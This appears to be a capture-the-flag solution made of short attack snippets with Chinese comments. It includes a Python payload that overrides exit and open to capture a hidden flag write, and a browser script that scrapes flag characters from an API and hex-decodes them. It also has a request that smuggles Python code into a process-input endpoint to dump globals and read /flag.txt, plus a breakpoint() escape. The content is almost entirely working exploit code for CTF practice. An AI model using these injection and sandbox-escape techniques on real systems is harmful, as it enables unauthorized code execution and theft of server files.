```python
# 声明我们要覆盖全局作用域的函数
global exit, open

# 覆盖 exit，让它什么都不做，从而继续执行后面的 flag 写入逻辑
def exit(code=None):
    pass

# 定义一个伪造的文件对象类
class Hook:
    def write(self, data):
        # 当 flag 逻辑调用 f.write(flag_content) 时，这里会打印 flag
        print(f"FLAG_FOUND: {data}")
    def __enter__(self):
        return self
    def __exit__(self, *args):
        pass

# 覆盖全局 open 函数
def open(file, mode='r'):
    return Hook()

print("Payload active, waiting for the hidden code...")
```


```js
(async () => {
    console.log("开始直接从 API 获取数据...");
    const total = parseInt(document.getElementById('totalPages').textContent) || 480;
    let hexResult = "";

    for (let i = 1; i <= total; i++) {
        try {
            // 直接调用代码里的 API 路径
            const response = await fetch(`/api/flag/char/${i}`);
            const data = await response.json();
            if (data.status === 'success') {
                hexResult += data.char;
                if (i % 20 === 0) console.log(`进度: ${i}/${total}`);
            }
        } catch (e) {
            console.error(`第 ${i} 页获取失败:`, e);
        }
    }

    console.log("=== 采集完成 ===");
    console.log("完整的 Base16 字符串：");
    console.log(hexResult);
    
    // 自动尝试转换
    try {
        let str = "";
        for (let n = 0; n < hexResult.length; n += 2) {
            str += String.fromCharCode(parseInt(hexResult.substr(n, 2), 16));
        }
        console.log("解码后的文本：", str);
    } catch(e) {
        console.log("解码失败，请手动到 CyberChef 解码。");
    }
})();
```
# 复仇
```javascript
fetch('/api/send_input', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        pid: '07e8460f4ead6ae8', // 确认这个PID依然是当前运行的那个
        input: '!import sys; print("---FLAG---"); print(globals().get("flag_content")); print(open("/flag.txt").read()); sys.stdout.flush()'
    })
});
```
```python
breakpoint()
while True:
    pass
```
